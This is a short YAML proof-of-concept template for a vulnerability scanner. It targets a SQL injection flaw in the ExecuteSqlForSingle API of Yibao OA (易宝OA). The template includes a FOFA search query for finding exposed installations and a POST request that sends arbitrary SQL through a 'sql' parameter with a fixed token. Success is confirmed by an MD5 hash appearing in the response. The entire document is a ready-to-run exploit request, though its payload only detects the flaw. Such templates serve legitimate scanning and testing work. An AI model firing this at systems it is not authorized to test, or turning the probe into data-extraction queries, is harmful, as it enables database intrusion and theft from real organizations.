id: poc-yaml-yi-bao-oa-system-executesqlforsingle-sqli
info:
  name: 易宝OA系统ExecuteSqlForSingle接口SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 易宝OA
  fofa: body="欢迎登录易宝OA系统"
variables:
  t1: random_int(1000,5000)
  t2: md5(t1)
requests:
- method: POST
  path: /api/system/ExecuteSqlForSingle
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{.t1}}')),3,32)&strParameters
  expression: 'status_code == 200

    && contains(body,t2)

    && contains(body,"\"message\":\"success\"")

    '
transport: http
